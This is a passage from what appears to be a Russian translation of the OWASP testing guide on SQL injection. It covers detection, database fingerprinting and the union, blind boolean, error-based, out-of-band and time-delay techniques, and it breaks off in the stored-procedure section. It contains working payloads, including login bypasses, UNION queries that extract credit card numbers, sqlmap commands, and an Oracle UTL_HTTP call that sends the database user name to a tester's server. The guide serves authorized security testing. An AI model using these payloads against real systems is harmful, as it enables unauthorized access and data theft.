# SQL-инъекция (SQL Injection)

| ID |
| --- |
| WSTG-INJT-05 |

## Резюме

Тестирование на внедрение SQL-кода (SQL Injection testing) проверяет возможность внедрения данных в приложение/сайт таким образом, чтобы оно выполнило контролируемый пользователем SQL-запрос в базе данных. Тестировщики обнаруживают уязвимость SQL Injection, если приложение использует ввод пользователя для формирования SQL-запросов без надлежащей валидации. Успешная эксплуатация этого класса уязвимостей позволяет неавторизованному пользователю получить доступ к данным в базе или манипулировать ими, что крайне критично с точки зрения безопасности.

Атака типа [внедрение SQL-кода (SQL Injection)](https://owasp.org/www-community/attacks/SQL_Injection) заключается во внедрении («инъекции») частичного или полного SQL-запроса через входные данные, передаваемые от клиента (браузера) веб-приложению. Успешная SQL-инъекция позволяет считывать конфиденциальные данные из базы данных, модифицировать информацию в БД (insert/update/delete), выполнять операции администрирования СУБД (например, остановку работы СУБД), читать содержимое произвольных файлов в файловой системе сервера СУБД или записывать файлы на диск, а в некоторых случаях — выполнять произвольные команды операционной системы. Атаки SQL Injection относятся к классу инъекционных атак, в которых команды SQL внедряются в поток пользовательских данных (data-plane input), влияя на выполнение предопределенных SQL-инструкций.

Как правило, веб-приложения динамически формируют SQL-инструкции, объединяя статический SQL-синтаксис, написанный разработчиком, с пользовательскими данными. Пример:

`select title, text from news where id=$id`

В приведенном выше примере переменная `$id` содержит пользовательские данные, тогда как остальная часть представляет собой статическую конструкцию SQL, заданную программистом, что делает SQL-инструкцию динамической.

Из-за такого способа построения запроса пользователь может передать специально сформированный ввод, чтобы заставить исходный SQL-запрос выполнить дополнительные действия по выбору атакующего. Приведенный ниже пример иллюстрирует передачу пользователем данных "10 or 1=1", изменяющих логику SQL-запроса за счет модификации предложения `WHERE` и добавления условия "or 1=1".

`select title, text from news where id=10 or 1=1`

> **_ПРИМЕЧАНИЕ:_**  Будьте осторожны при внедрении условия OR 1=1 в SQL-запрос. Хотя это может быть безвредным в исходном контексте инъекции, приложения часто используют данные из одного запроса в нескольких различных операциях к БД. Если ваше условие попадет, например, в инструкцию UPDATE или DELETE, это может привести к случайной потере данных.

Атаки SQL Injection можно разделить на следующие три класса:

- Внутриполосные (Inband): извлечение данных осуществляется по тому же каналу, который используется для внедрения SQL-кода. Это наиболее прямолинейная атака, при которой полученные данные отображаются непосредственно на веб-странице приложения.
- Внеполосные (Out-of-band): извлечение данных происходит по отдельному каналу (например, генерируется электронное письмо с результатами запроса и отправляется тестировщику).
- Логические (выводные) или слепые (Inferential or Blind): фактическая передача данных в ответе отсутствует. Тем не менее тестировщик может восстановить информацию, отправляя специфические запросы и наблюдая за результирующим поведением сервера БД.

Для успешной атаки SQL Injection атакующему необходимо сформировать синтаксически корректный SQL-запрос. Если приложение возвращает сообщение об ошибке, сгенерированное некорректным запросом, злоумышленнику может быть проще восстановить логику исходного запроса и понять, как правильно провести инъекцию. Однако если приложение скрывает детали ошибок, тестировщик должен восстанавливать логику исходного запроса методами обратной разработки (reverse engineering).

Выделяют пять распространенных техник эксплуатации уязвимостей SQL-инъекций. Кроме того, эти техники иногда можно комбинировать (например, оператор UNION и внеполосный канал):

- Оператор Union (Union Operator): может использоваться, когда уязвимость инъекции возникает в инструкции SELECT, позволяя объединить два запроса в единый результирующий набор.
- Логическая (Boolean): использует булевы условия для проверки истинности или ложности определенных выражений.
- На основе ошибок (Error-based): заставляет базу данных генерировать ошибку, предоставляя атакующему или тестировщику диагностическую информацию для уточнения полезной нагрузки.
- Внеполосная (Out-of-band): методика, используемая для извлечения данных по альтернативному каналу (например, инициирование HTTP-соединения для отправки результатов на веб-сервер).
- На основе задержек времени (Time delay): использует команды базы данных (например, sleep) для задержки ответов в условных запросах. Полезна, когда атакующий не получает прямого отклика (результата, вывода или ошибки) от приложения.

## Цели тестирования

- Идентифицировать точки внедрения SQL-кода.
- Оценить степень критичности инъекции и уровень доступа, которого можно достичь с ее помощью.

## Методика тестирования

### Методы обнаружения

Первым шагом в этом тесте является понимание того, когда именно приложение взаимодействует с сервером БД для доступа к данным. Типичные примеры ситуаций, когда приложению требуется обращение к БД, включают:

- Формы аутентификации: когда аутентификация выполняется через веб-форму, высока вероятность, что учетные данные пользователя проверяются по базе данных, содержащей все логины и пароли (или, что предпочтительнее, хэши паролей).
- Поисковые механизмы: строка, отправленная пользователем, может использоваться в SQL-запросе, извлекающем все релевантные записи из базы данных.
- Сайты электронной коммерции: товары и их характеристики (цена, описание, наличие на складе и т. д.) с высокой вероятностью хранятся в базе данных.

Тестировщик должен составить список всех полей ввода, значения которых могут использоваться при формировании SQL-запроса, включая скрытые поля POST-запросов, а затем протестировать их по отдельности, пытаясь повлиять на выполнение запроса и вызвать ошибку. Обратите внимание также на HTTP-заголовки и файлы cookie.

Самый первый тест обычно заключается во внедрении одинарной кавычки `'` или точки с запятой `;` в проверяемое поле или параметр. Первая используется в SQL как признак окончания строки и, если не фильтруется приложением, приводит к синтаксически некорректному запросу. Вторая используется для завершения SQL-инструкции и при отсутствии фильтрации также способна вызвать ошибку. Ответ уязвимого поля может выглядеть следующим образом (в данном случае на Microsoft SQL Server):

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

Также для попытки модификации запроса можно использовать символы комментариев (`--` или `/* */` и т. д.) и другие ключевые слова SQL, такие как `AND` и `OR`. Очень простой, но иногда весьма действенной техникой является простая подстановка строки туда, где ожидается число, что может вызвать подобную ошибку:

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

Контролируйте все ответы веб-сервера и анализируйте исходный HTML/JavaScript-код. Иногда ошибка содержится внутри кода страницы, но по какой-то причине (например, из-за ошибки JavaScript, HTML-комментариев и т. д.) не отображается пользователю на экране. Полное сообщение об ошибке, подобное приведенным в примерах, предоставляет тестировщику массу ценной информации для построения успешной инъекции. Однако приложения нередко не предоставляют столь подробных сведений: может возвращаться лаконичное сообщение '500 Server Error' или кастомная страница ошибки, что означает необходимость применения методов слепой инъекции (blind injection). В любом случае крайне важно тестировать каждое поле изолированно: изменяться должна только одна переменная при неизменных остальных, чтобы точно определить, какие именно параметры уязвимы, а какие нет.

### Стандартные методы тестирования на SQL-инъекции

#### Классическая SQL-инъекция

Рассмотрим следующий SQL-запрос:

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

Подобный запрос обычно используется веб-приложением для аутентификации пользователя. Если запрос возвращает значение, это означает, что в базе данных существует пользователь с указанными учетными данными, и ему разрешается вход в систему; в противном случае доступ запрещается. Значения полей ввода обычно передаются пользователем через веб-форму. Предположим, мы вводим следующие значения Username и Password:

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

Запрос примет вид:

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

> **_ПРИМЕЧАНИЕ:_**  Будьте осторожны при внедрении условия OR 1=1 в SQL-запрос. Хотя это может быть безвредным в исходном контексте инъекции, приложения часто используют данные из одного запроса в нескольких различных операциях к БД. Если ваше условие попадет, например, в инструкцию UPDATE или DELETE, это может привести к случайной потере данных.

Если предположить, что значения параметров отправляются на сервер методом GET, а доменом уязвимого сайта является `www.example.com`, отправляемый запрос будет выглядеть так:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

После краткого анализа мы видим, что запрос возвращает значение (или набор значений), поскольку условие всегда истинно (`OR 1=1`). Таким образом, система успешно аутентифицирует пользователя без знания истинных имени пользователя и пароля.

> Примечание: В некоторых системах первой строкой таблицы пользователей является учетная запись администратора. В некоторых случаях может возвращаться именно ее профиль.

Другой пример запроса:

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

В этом случае возникают две проблемы: одна связана с использованием круглых скобок, а вторая — с применением хэш-функции MD5. Прежде всего решим проблему со скобками. Для этого достаточно добавить несколько закрывающих скобок, пока запрос не станет синтаксически корректным. Для решения второй проблемы попытаемся обойти второе условие. Добавим в наш запрос символ начала комментария. В результате все, что следует за этим символом, будет считаться комментарием. Каждая СУБД имеет свой синтаксис комментариев, однако общим символом для подавляющего большинства баз данных является `/*`. В Oracle таким символом выступает `--`. Исходя из этого, для полей Username и Password мы используем следующие значения:

`$username = 1' or '1' = '1'))/*`

`$password = foo`

В результате мы получим следующий запрос:

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

(Благодаря включению символа комментария в значение `$username` часть запроса с паролем будет проигнорирована.)

URL-запрос примет вид:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

Это может вернуть определенные значения. Иногда код аутентификации проверяет, чтобы число возвращенных записей/результатов было строго равно 1. В приведенных ранее примерах выполнение этого условия может быть затруднено (если в базе содержится несколько записей). Чтобы обойти данное ограничение, достаточно добавить SQL-команду, требующую возврата ровно одного результата (одной записи). Для достижения этой цели используется оператор `LIMIT <num>`, где `<num>` — количество возвращаемых записей. Применительно к предыдущему примеру значения полей Username и Password модифицируются следующим образом:

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

Таким образом, формируется запрос следующего вида:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

#### Инструкция SELECT

Рассмотрим следующий SQL-запрос:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к скрипту, выполняющему указанный SQL-запрос:

`https://www.example.com/product.php?id=10`

Когда тестировщик передает корректное значение (в данном случае 10), приложение возвращает описание товара. Хороший способ проверить, уязвимо ли приложение в данном сценарии, — поэкспериментировать с логикой с помощью операторов AND и OR.

Рассмотрим запрос:

`https://www.example.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

В этом случае приложение, скорее всего, вернет сообщение об отсутствии доступного контента либо пустую страницу. Затем тестировщик может отправить заведомо истинное утверждение и проверить, возвращается ли корректный результат:

`https://www.example.com/product.php?id=10 AND 1=1`

#### Стекированные запросы (Stacked Queries)

В зависимости от API, используемого веб-приложением, и целевой СУБД (например, PHP + PostgreSQL, ASP + SQL Server), может существовать возможность выполнения нескольких запросов в рамках одного вызова (пакетные или составные запросы — stacked queries).

Рассмотрим следующий SQL-запрос:

`SELECT * FROM products WHERE id_product=$id_product`

Способ эксплуатации приведенного сценария:

`https://www.example.com/product.php?id=10; INSERT INTO users (…)`

Таким способом можно последовательно выполнить множество запросов, независимых от первого запроса.

### Определение отпечатка базы данных

Несмотря на то что язык SQL стандартизирован, каждая СУБД имеет свои особенности и отличается от других во многих аспектах, таких как специализированные команды, функции извлечения системных данных (имен пользователей и баз данных), функциональные возможности, синтаксис комментариев и т. д.

Переходя к более сложной эксплуатации SQL-инъекций, тестировщикам необходимо точно определить, какая СУБД используется на бэкенде.

#### Ошибки, возвращаемые приложением

Первый способ определить тип используемой серверной СУБД — анализ сообщений об ошибках, возвращаемых приложением. Ниже приведены примеры сообщений об ошибках:

MySql:

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

Полный запрос UNION SELECT с вызовом version() также помогает определить СУБД бэкенда.

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

`ORA-00933: SQL command not properly ended`

MS SQL Server:

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

Если сообщения об ошибках отсутствуют или выводится кастомная страница ошибки, тестировщик может попытаться внедрить полезную нагрузку в строковые поля, используя различные техники конкатенации:

- MySql: ‘test’ + ‘ing’
- SQL Server: ‘test’ ‘ing’
- Oracle: ‘test’||’ing’
- PostgreSQL: ‘test’||’ing’

### Техники эксплуатации

#### Техника эксплуатации с использованием оператора UNION

Оператор UNION используется в SQL-инъекциях для объединения специально сформированного тестировщиком запроса с исходным запросом. Результат внедренного запроса будет объединен с результатом исходного, позволяя тестировщику извлечь значения столбцов из других таблиц. Предположим, что сервер выполняет следующий запрос:

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

Зададим следующее значение для `$id`:

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

В итоге мы получим следующий запрос:

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Который объединит результат исходного запроса со всеми номерами кредитных карт из таблицы CreditCardTable. Ключевое слово `ALL` необходимо для обхода запросов, использующих ключевое слово `DISTINCT`. Кроме того, мы видим, что помимо номеров кредитных карт мы выбрали два дополнительных значения. Эти два значения необходимы, поскольку оба запроса обязаны иметь одинаковое количество параметров/столбцов во избежание синтаксической ошибки.

Первая деталь, которую тестировщик должен выяснить для эксплуатации уязвимости SQL-инъекции с помощью этой техники, — точное количество столбцов в инструкции SELECT.

Для этого тестировщик может использовать предложение `ORDER BY` с числом, указывающим порядковый номер столбца БД в выборке:

`https://www.example.com/product.php?id=10 ORDER BY 10--`

Если запрос выполняется успешно, тестировщик может предположить, что в инструкции `SELECT` присутствует 10 или более столбцов. Если запрос завершается ошибкой, значит, запрос возвращает менее 10 столбцов. Если доступно сообщение об ошибке, оно, вероятно, будет выглядеть так:

`Unknown column '10' in 'order clause'`

После выяснения количества столбцов следующим шагом является определение типов данных этих столбцов. Предположив, что в приведенном выше примере было 3 столбца, тестировщик может проверить тип каждого столбца, используя значение NULL:

`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

Если запрос завершается ошибкой, тестировщик, скорее всего, увидит сообщение вида:

`All cells in a column must have the same datatype`

Если запрос выполнен успешно, первый столбец может иметь целочисленный тип. Затем тестировщик переходит к следующему столбцу и так далее:

`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

После успешного сбора информации приложение, в зависимости от своей логики, может отобразить тестировщику только первый результат выборки, если обрабатывается только первая строка результирующего набора. В этом случае можно использовать предложение `LIMIT` либо задать заведомо несуществующее значение, чтобы валидным оказался только второй запрос (предполагая, что в базе нет записи с ID, равным 99999):

`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

#### Техника эксплуатации скрытого оператора UNION

Эксплуатация SQL-инъекции с помощью [техники Union](#техника-эксплуатации-с-использованием-оператора-union) является наиболее предпочтительной, поскольку позволяет извлечь результат запроса в рамках одного HTTP-обращения.  
Однако большинство SQL-инъекций на практике являются слепыми (blind). Тем не менее некоторые из них можно преобразовать в инъекции на основе объединения (union-based).

**Identification**  
Для выявления таких SQL-инъекций можно использовать любой из следующих признаков:

1. Уязвимый запрос возвращает данные, но сама инъекция является слепой.
2. Техника с `ORDER BY` срабатывает, но провести классическую union-инъекцию не удается.

**Root Cause**  
Причина невозможности использования стандартных техник Union кроется в сложности структуры уязвимого запроса. При классической технике Union вы закомментируете остальную часть запроса после своей полезной нагрузки `UNION`. Это отлично работает для простых запросов, но в более сложных конструкциях может вызвать сбой. Если первая часть запроса зависит от второй, комментирование остатка ломает исходный запрос.  

**Scenario 1**  
Уязвимый запрос представляет собой подзапрос, а возврат данных обрабатывается родительским запросом.

```text
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |
      orders                 |--> vulnerable query
    WHERE                    |
      cost > 200             |
  );                      --/
```

- _Проблема:_ Внедрение полезной нагрузки `UNION` не влияет на возвращаемые данные, поскольку вы модифицируете секцию `WHERE`. По сути, вы не присоединяете запрос `UNION` к исходному результирующему запросу.  
- _Решение:_ Необходимо знать запрос, выполняемый на бэкенде, и конструировать пейлоад на его основе. Это означает закрытие открытых скобок или добавление необходимых ключевых слов при необходимости.

**Scenario 2**  
Уязвимый запрос содержит псевдонимы (aliases) или объявления переменных.

```text
SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
  ) AS overlap                                                                           --/
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
```

- _Проблема:_ Вы ломаете запрос, закомментировав остальную часть исходного запроса после внедренной полезной нагрузки, поскольку часть псевдонимов или переменных становится неопределенной (`undefined`).  
- _Решение:_ Необходимо поместить соответствующие ключевые слова или псевдонимы в начало вашей полезной нагрузки. Таким образом первая часть исходного запроса останется валидной.

**Scenario 3**  
Результат уязвимого запроса используется во втором запросе. Именно второй запрос возвращает данные, а не первый.

```text
<?php
// retrieves product ID based on product name
                            --\
$query1 = "SELECT              |
             id                |
           FROM                |
             products          |--> vulnerable query #1
           WHERE               |
             name = '$name'";  |
                            --/
$result1 = odbc_exec($conn, $query1);
// retrieves product's comments based on the product ID
                              --\
$query2 = "SELECT                |
             comments            |
           FROM                  |
             products            |--> vulnerable query #2
           WHERE                 |
             id = '$result1'";   |
                              --/
$result1 = odbc_exec($conn, $query2);
?>
```

- _Проблема:_ Вы можете добавить нагрузку `UNION` к первому запросу, но это не повлияет на возвращаемые данные.  
- _Решение:_ Инъекцию необходимо направить во второй запрос. Для этого входные данные для второго запроса не должны подвергаться санитизации. Затем нужно сделать так, чтобы первый запрос не вернул никаких данных, и добавить запрос `UNION`, возвращающий пейлоад, который вы хотите внедрить во *второй запрос*.  
  
  **Пример:**  
  Базовая часть полезной нагрузки (внедряемая в первый запрос):

  ```text
  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
  ```

  Значение `PAYLOAD` — это то, что вы хотите внедрить во *второй запрос*:
  
  ```text
  ' AND 1=2 UNION SELECT ...
  ```

  Итоговая полезная нагрузка (после подстановки `PAYLOAD`):

  ```text
  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                            \________________________/
                                        ||
                                        \/
                                  the payload that
                                   gets injected
                                into the second query
  \________________________________________________________/
                              ||
                              \/
    the actual query we inject into the vulnerable parameter
  ```

  Первый запрос после инъекции:

  ```text
  SELECT               --\
    id                    |
  FROM                    |----> first query
    products              |
  WHERE                   |
    name = 'abcd'      --/
    AND 1 = 2                                 --\
  UNION                                          |----> injected payload (what gets injected into the second payload)
  SELECT                                         |
    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
  ```

  Второй запрос после инъекции:

  ```text
  SELECT            --\
    comments           |
  FROM                 |----> second query
    products           |
  WHERE                |
    id = ''         --/
    AND 1 = 2         --\ 
  UNION                  |----> injected payload (the final UNION query that controls the returned data)
  SELECT ... -- -'    --/
  ```

**Scenario 4**  
Уязвимый параметр используется в нескольких независимых запросах.

```text
<?php
//retrieving product details based on product ID
$query1 = "SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result1 = odbc_exec($conn, $query1);
//retrieving product comments based on the product ID
$query2 = "SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result2 = odbc_exec($conn, $query2);
?>
```

- _Проблема:_ Добавление запроса `UNION` к первому (или второму) запросу не ломает его, но может нарушить синтаксис другого запроса.  
- _Решение:_ Зависит от структуры кода приложения. Однако первым шагом всегда является определение исходного запроса. В большинстве случаев подобные инъекции эксплуатируются через временные задержки (time-based). Кроме того, пейлоад с задержкой внедряется в несколько запросов, что может вызывать сложности.  
  Например, при использовании `SQLMap` такая ситуация сбивает инструмент с толку, и вывод нарушается, так как задержки не соответствуют ожидаемым.  

**Extracting Original Query**  
Как видно, знание исходного запроса всегда необходимо для реализации инъекции на основе объединения.  
Извлечь исходный запрос можно с помощью системных таблиц СУБД по умолчанию:

| DBMS                 | Table                          |
|----------------------|--------------------------------|
| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
| PostgreSQL           | pg_stat_activity               |
| Microsoft SQL Server | sys.dm_exec_cached_plans       |
| Oracle               | V$SQL                          |

**Automation**  
Шаги по автоматизации рабочего процесса:

1. Извлечь исходный запрос с помощью `SQLMap` и слепой инъекции.
2. Сконструировать базовую полезную нагрузку в соответствии с исходным запросом и получить union-based инъекцию.
3. Автоматизировать эксплуатацию union-based инъекции одним из следующих способов:  
    - Указанием пользовательского маркера точки внедрения (`*`)
    - Использованием флагов `--prefix` и `--suffix`.

**Пример:**  
Рассмотрим третий сценарий, разобранный выше.  
Предположим, что СУБД — `MySQL`, а первый и второй запросы возвращают только один столбец.  
Ваша полезная нагрузка для извлечения версии базы данных может выглядеть так:

```text
' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
```

Тогда целевой URL примет вид:

```text
https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
```

Автоматизация:  

- пользовательский маркер точки внедрения (`*`):

  ```text
  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
  ```

- флаги `--prefix` и `--suffix`:

  ```text
  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
  ```

#### Техника эксплуатации на основе булевых выражений

Методика эксплуатации на основе булевых условий (Boolean exploitation technique) крайне полезна в ситуации слепой инъекции ([Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)), когда о результате операции ничего не известно напрямую. Например, это происходит в случаях, когда разработчик создал кастомную страницу ошибки, не раскрывающую структуру запроса или базы данных и не возвращающую никаких SQL-ошибок — сервер может возвращать лишь HTTP 404, 500 или выполнять перенаправление (редирект).

Используя методы логического вывода (inference methods), можно обойти это препятствие и восстановить значения требуемых полей. Метод заключается в выполнении серии булевых запросов к серверу, анализе ответов и дедуктивном определении их смысла. Рассмотрим, как обычно, домен `www.example.com` и предположим, что он содержит параметр `id`, уязвимый к внедрению SQL-кода. Это означает, что при выполнении следующего запроса:

`https://www.example.com/index.php?id=1'`

мы получим страницу с кастомным сообщением об ошибке, вызванной синтаксическим сбоем в запросе. Предположим, что на сервере выполняется запрос:

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

который уязвим рассмотренными ранее методами. Мы хотим получить значения поля username. Проводимые тесты позволят извлечь значение поля username символ за символом. Это возможно благодаря использованию стандартных функций, присутствующих практически в любой СУБД. Для нашего примера мы используем следующие псевдофункции:

- SUBSTRING (text, start, length): возвращает подстроку, начинающуюся с позиции "start" текста text и имеющую длину "length". Если "start" больше длины текста, функция возвращает значение null.

- ASCII (char): возвращает ASCII-код входного символа. Если char равен 0, возвращается значение null.

- LENGTH (text): возвращает количество символов во входном тексте.

С помощью этих функций мы проводим проверку первого символа и, определив его значение, переходим ко второму и так далее, пока не восстановим строку целиком. Тесты используют функцию SUBSTRING для выбора одного символа за раз (выбор одного символа означает установку параметра длины в 1) и функцию ASCII для получения числового кода ASCII, что позволяет выполнять операции численного сравнения. Результаты сравнения сопоставляются со всеми значениями таблицы ASCII до тех пор, пока не будет найдено совпадение. В качестве примера используем следующее значение для `Id`:

`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

Это формирует следующий запрос (далее мы будем называть его «логическим запросом» `[inferential query]`):

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

Приведенный запрос вернет результат тогда и только тогда, когда первый символ поля username равен ASCII-коду 97. Если возвращается ложное значение (false), мы увеличиваем индекс таблицы ASCII с 97 до 98 и повторяем запрос. Если же получен результат true, мы сбрасываем индекс таблицы ASCII в ноль и переходим к анализу следующего символа, изменяя параметры функции SUBSTRING. Сложность заключается в том, как отличить тесты, возвращающие истинное значение, от тестов, возвращающих ложь. Для этого мы создаем запрос, который заведомо возвращает false. Это можно сделать, передав следующее значение `Id`:

`$Id=1' AND '1' = '2`

Что сформирует запрос:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

Полученный ответ от сервера (то есть HTML-код) послужит эталоном значения false для наших тестов. Этого достаточно, чтобы проверить, совпадает ли ответ логического запроса с эталоном. Иногда этот метод дает сбой. Если сервер возвращает две разные страницы в результате двух идентичных последовательных запросов, отличить истинный результат от ложного будет невозможно. В таких особых случаях необходимо применять специальные фильтры, позволяющие устранить изменяющийся между запросами код и получить стабильный шаблон. Впоследствии для каждого выполненного логического запроса мы извлекаем относительный шаблон из ответа с помощью той же функции и сравниваем два шаблона для определения результата теста.

В предыдущих рассуждениях мы не затрагивали вопрос определения условия завершения тестов, то есть момента, когда процедуру вывода следует остановить. Один из методов основан на особенности функций SUBSTRING и LENGTH. Когда тест сравнивает текущий символ с ASCII-кодом 0 (то есть значением null) и тест возвращает значение true, это означает либо завершение процедуры логического вывода (мы просканировали всю строку), либо присутствие нулевого символа в анализируемом значении.

Мы передаем следующее значение поля `Id`:

`$Id=1' OR LENGTH(username)=N AND '1' = '1`

где N — количество символов, проанализированных к текущему моменту (не считая значения null). Запрос примет вид:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`

Запрос возвращает либо true, либо false. Если получен результат true, процесс логического вывода завершен, и, следовательно, значение параметра нам известно. Если получен результат false, это означает, что в значении параметра присутствует символ null, и мы должны продолжить анализ следующего символа, пока не встретим очередное значение null.

Атака методом Blind SQL Injection требует отправки большого количества запросов. Тестировщику, скорее всего, понадобятся автоматизированные утилиты для эксплуатации данной уязвимости.

#### Техника эксплуатации на основе ошибок

Методика эксплуатации на основе ошибок (Error-based exploitation) полезна в случаях, когда тестировщик по тем или иным причинам не может применить другие техники, такие как UNION. Техника на основе ошибок заключается в принуждении базы данных к выполнению операции, результатом которой становится ошибка. Суть метода состоит в том, чтобы извлечь часть данных из базы данных и отобразить их непосредственно в тексте сообщения об ошибке. Реализация этой техники различается в зависимости от конкретной СУБД (см. соответствующие разделы по СУБД).

Рассмотрим следующий SQL-запрос:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к скрипту, выполняющему указанный SQL-запрос:

`https://www.example.com/product.php?id=10`

Вредоносный запрос примет вид (например, для Oracle):

`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

В этом примере тестировщик конкатенирует значение 10 с результатом функции `UTL_INADDR.GET_HOST_NAME`. Эта функция Oracle пытается вернуть имя хоста для переданного ей параметра, который сам по себе является другим запросом, возвращающим имя пользователя. Когда база данных пытается разрешить имя хоста, содержащее имя пользователя БД, операция завершается сбоем и возвращает сообщение об ошибке вида:

`ORA-292257: host SCOTT unknown`

Таким образом, тестировщик может манипулировать параметром, передаваемым в функцию GET_HOST_NAME(), и результат выполнения внедренного запроса будет отображен в сообщении об ошибке.

#### Техника внеполосной эксплуатации

Эта техника крайне полезна в ситуациях слепой инъекции ([Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)), когда о результате операции ничего не известно напрямую. Техника заключается в вызове функций СУБД для установки внеполосного соединения и передачи результатов внедренного запроса в составе обращения к серверу тестировщика. Как и в случае с техниками на основе ошибок, каждая СУБД имеет собственный набор функций. Обратитесь к разделам по конкретным СУБД.

Рассмотрим следующий SQL-запрос:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к скрипту, выполняющему указанный SQL-запрос:

`https://www.example.com/product.php?id=10`

Вредоносный запрос примет вид:

`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`

В этом примере тестировщик конкатенирует значение 10 с результатом функции `UTL_HTTP.request`. Данная функция Oracle пытается подключиться к `testerserver` и выполнить HTTP GET-запрос, содержащий результат выполнения запроса `SELECT user FROM DUAL`. Тестировщик может поднять веб-сервер (например, Apache) или воспользоваться утилитой Netcat:

```bash
/home/tester/nc -nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### Техника эксплуатации с использованием временных задержек

Техника эксплуатации на основе временных задержек крайне эффективна в ситуациях слепой инъекции ([Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)), когда о результате операции ничего не известно напрямую. Данный метод заключается в отправке внедренного запроса, содержащего условие: если условие истинно, тестировщик может зафиксировать задержку ответа сервера. При наличии задержки тестировщик делает вывод об истинности условного выражения. Эта техника эксплуатации может существенно различаться в зависимости от СУБД (см. соответствующие разделы по СУБД).

Рассмотрим следующий SQL-запрос:

`SELECT * FROM products WHERE id_product=$id_product`

Рассмотрим также запрос к скрипту, выполняющему указанный SQL-запрос:

`https://www.example.com/product.php?id=10`

Вредоносный запрос примет вид (например, для MySQL 5.x):

`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`

В этом примере тестировщик проверяет, начинается ли версия MySQL с 5.x, заставляя сервер задержать ответ на 10 секунд. Тестировщик может увеличивать время задержки и отслеживать отклики. Кроме того, тестировщику не обязательно дожидаться полного ответа: иногда можно задать очень большое значение (например, 100) и оборвать запрос через несколько секунд.

#### Внедрение в хранимые процедуры (Stored Procedure Injection)

При использовании динамического SQL внутри хранимой процедуры приложение обязано должным образом санитизировать пользовательский ввод для исключения риска внедрения кода. При отсутствии санитизации пользователь может ввести вредоносный SQL-код, который выполнится в контексте хранимой процедуры.

Рассмотрим следующую хранимую процедуру SQL Server:

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
